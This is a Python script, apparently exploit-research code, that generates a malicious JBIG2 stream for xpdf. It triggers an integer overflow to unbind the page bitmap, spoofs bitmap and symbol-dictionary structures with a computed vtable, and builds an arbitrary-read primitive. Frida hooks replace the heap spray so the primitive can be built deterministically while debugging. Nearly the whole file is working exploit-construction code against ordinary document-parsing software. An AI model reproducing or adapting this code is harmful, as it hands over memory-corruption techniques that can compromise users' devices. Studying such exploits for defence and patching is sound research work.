from constants import *
from segments import *

def spoof_unbound_page(f):
    """
    This method works in combination with some frida hooks to spoof
    a successful exploit. It will create the same size page used in the actual
    exploit, and set large page pageW and pageH.
    """
    # same size page that will be allocated for actual exploit
    pis = pageInfoSegment(0x3F1, 1, 0, 0, 0, 0)
    pis_sh = segmentHeader(4, 0x30, 0, 1, len(pis.raw()))
    f.write(pis_sh.raw() + pis.raw())
    # debug hook does var initialization on first pass, so call it now
    f.write(debug_sh.raw())
    # spoof doing heap spray and triggering vuln
    f.write(spoof_unbound_sh.raw())
    # with frida hooks in place, this should have the same effect as successfully hitting
    # the overflow and unbounding the page


def frida_experimentation():
    """
    The pdf generated is for frida experimentation. Rather than performing
    the whole heap spray, frida hooks are used to unbound the page. This is
    useful for debugging/experimenting/building primitives deterministically

    Create malicious pdf for xpdf. Jbig2 image is generated with a python script
    and requires both a .sym and .0000 file.
    """
    with open("poc.sym", "wb") as f:
        """
        Populate the globalSegments variable with a symbol dictionary that
        will be referenced later to increment syms buffer size granularly by 1.
        This is stored in the globalSegments list so that overflow/boundless
        write doesn't corrupt this segment.
        """
        sds = symbolDictionarySegment(0, [0x03,0xFD,0x02,0xFE], [0xFF,0xFF,0xFE,0xFE], 1, 1, b"\x93\xFC\x7F\xFF\xAC")
        sds_sh = segmentHeader(0xff, 0, 1, 0, len(sds.raw()))
        f.write(sds_sh.raw() + sds.raw())


    with open("poc.0000", "wb") as f:
        """
        Generate the rest of the malicious PDF
        """
        # needed to appease a check for a page before storing bitmaps. This
        # page will be swapped out during the heap spray
        pis = pageInfoSegment(1, 1, 0, 0, 0, 0)
        pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))
        f.write(pis_sh.raw() + pis.raw())


        """
        Exploit the int overflow to unbound the backing page bitmap
        """
        # pretend to exploit the vulnerability
        spoof_unbound_page(f)
        # set pageW and pageH to large values. Sanity check fails
        #   if (pageW == 0 || pageH == 0 || pageW > INT_MAX / pageW)
        # and returns immediately with pageW and pageH still set to 
        # large values. 
        pis = pageInfoSegment(0xffffffff, 0xfffffffe, 0, 0, 0, 0)
        pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))	
        f.write(pis_sh.raw() + pis.raw())	


        """
        Demonstrate arbitrary dereference of address
        """
        

        """
        Spoof a jbig2 bitmap @ 0x0 - 0x20 in pageBitmap
        
         0 1 2 3 4 5 6 7
        +-+-+-+-+-+-+-+-+ 0x0
        |     vtable    |
        +-+-+-+-+-+-+-+-+ 0x8
        |segNum |   w   |
        +-+-+-+-+-+-+-+-+ 0x10
        |   h   | line  |
        +-+-+-+-+-+-+-+-+ 0x18
        |      data     |
        +-+-+-+-+-+-+-+-+ 0x20
        """
        # JBIG2Stream::readExtensionSeg frida hook spoofs a relative
        # copy of the backing pageBitmap. Normal copy is commented below.
        # This copy can't be done in testing mode because the offset to the pageBitmap
        # isn't constant (no heap spray)
            # replace_offset_to_offset(f, spoofed_bitmap, data_buffer_to_bitmap, 0x20)
        # Store pointer to orig pageBitmap data buffer, this will be used
        # to make multiple calculations	
        replace_offset_to_offset(f, storage1, spoofed_bitmap_data, 8)
        # setup spoofed bitmap
        replace_bytes_at_offset(f, spoofed_bitmap_segnum, struct.pack("<I", 0xdeadbeef))
        replace_bytes_at_offset(f, spoofed_bitmap_w, struct.pack("<I", 0x40))
        replace_bytes_at_offset(f, spoofed_bitmap_h, struct.pack("<I", 1))
        replace_bytes_at_offset(f, spoofed_bitmap_line, struct.pack("<I", 1))
        # data pointer will be populated later

        # copy corrupted page bitmap as template
            # replace_offset_to_offset(f, spoofed_bitmap, data_buffer_to_bitmap, 0x20)

        """
        Spoof a Symbol Dictionary Segment that references the spoofed jbig2 bitmap
        
         0 1 2 3 4 5 6 7
        +-+-+-+-+-+-+-+-+ 0x0
        |     vtable    |
        +-+-+-+-+-+-+-+-+ 0x8
        |segNum | size  |
        +-+-+-+-+-+-+-+-+ 0x10
        |   **bitmaps   | ------+
        +-+-+-+-+-+-+-+-+ 0x18  |
        |      data     |       |
        +-+-+-+-+-+-+-+-+ 0x20  |
        |*genRegionStats|       |
        +-+-+-+-+-+-+-+-+ 0x28  |
        |*refRegionStats|       |
        +-+-+-+-+-+-+-+-+ 0x30  |
        |*spoofedBitmap | <-----+ 
        +-+-+-+-+-+-+-+-+ 0x38
        spoofedBitmap isn't part of the canonical struct, rather it's a portion of
        the pageBitmap used to store a pointer to the spoofed bitmap. The SDS
        sees a list of size 1 that includes the spoofed bitmap
        """
        # Store pointer to spoofed SDS, this will be written into the segments list later

        ## calculate vtable for jbig2 symbol dic 
        # jbit2bitmap vtable offset: 0x1B14F0
        # jbit2 sds vtable offset: 0x1B1518
        # 0x1B1518 - 0x1B14F0 = bitmap_vtable_to_sds_vtable
        # copy spoofed vtable into rax
        replace_offset_to_offset(f, rax, spoofed_bitmap_vtable, 8)
        zero_register(f, rbx)
        # load offset into rbx
        replace_bytes_at_offset(f, rbx, struct.pack("<I", bitmap_vtable_to_sds_vtable))
        add64(f, rax, rbx)
        # write vtable
        replace_offset_to_offset(f, spoofed_sds_vtable, rax, 8)
        
        # populate segnum
        replace_bytes_at_offset(f, spoofed_sds_segnum, struct.pack("<I", 0xde))
        
        # populate size
        replace_bytes_at_offset(f, spoofed_sds_size, struct.pack("<I", 0x1))
        
        # calculate pointer to spoofed *bitmap array
        # load base addr into rbx
        zero_register(f, rax)
        replace_offset_to_offset(f, rbx, storage1, 8)
        # load offset into rax
        replace_bytes_at_offset(f, rax, struct.pack("<I", spoofed_sds_bitmap_list))
        add64(f, rax, rbx)
        # move calculated pointer into spoofed sds
        replace_offset_to_offset(f, spoofed_sds_bitmaps, rax, 8)

        # populate unused pointers, just for fun
        replace_bytes_at_offset(f, spoofed_sds_generic_region_stats, struct.pack("<I", 0x41414141))
        replace_bytes_at_offset(f, spoofed_sds_generic_region_stats + 4, struct.pack("<I", 0x41414141))
        
        replace_bytes_at_offset(f, spoofed_sds_refinement_region_stats, struct.pack("<I", 0x42424242))
        replace_bytes_at_offset(f, spoofed_sds_refinement_region_stats + 4, struct.pack("<I", 0x42424242))
        
        # move pointer to spoofed bitmap into bitmap* array directly after spoofed sds
        replace_offset_to_offset(f, spoofed_sds_bitmap_list, storage1, 8)
        
        """
        Construction of primitive is almost complete! Must insert the spoofed SDS,
        then calculate the address to read
        """
        # insert spoofed sds into list
        # the xpdf frida script uses this NOP segment to spoof an insert into segments.
        # once this insert happens, the SDS will remain in segments and can be referenced
        # multiple times.
        f.write(toggle_debug_sh.raw()) 

        # modify jbig2bitmap pointer to point to rdx
        zero_register(f, rax)
        replace_bytes_at_offset(f, rax, struct.pack("<I", rdx))
        add64(f, rax, rbx)
        replace_offset_to_offset(f, spoofed_bitmap_data, rax, 8)

        # try to this read arb value from rdx
        replace_bytes_at_offset(f, rdx, struct.pack("<I", 0x44434241))
        replace_bytes_at_offset(f, rdx + 4, struct.pack("<I", 0x48474645))

        # this text region segment references the spoofed sds, and will move the contents
        # of the spoofed bitmap to rcx
        trs = textRegionSegment(64, 1, (rcx << 3), 0, REPLACE, 0, 1, b"\xa9\x1e\x7f\xff\xac")
        trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
        f.write(trs_sh.raw() + trs.raw())
        f.write(debug_sh.raw())


    # demo done! rest of the work will be done on iOS

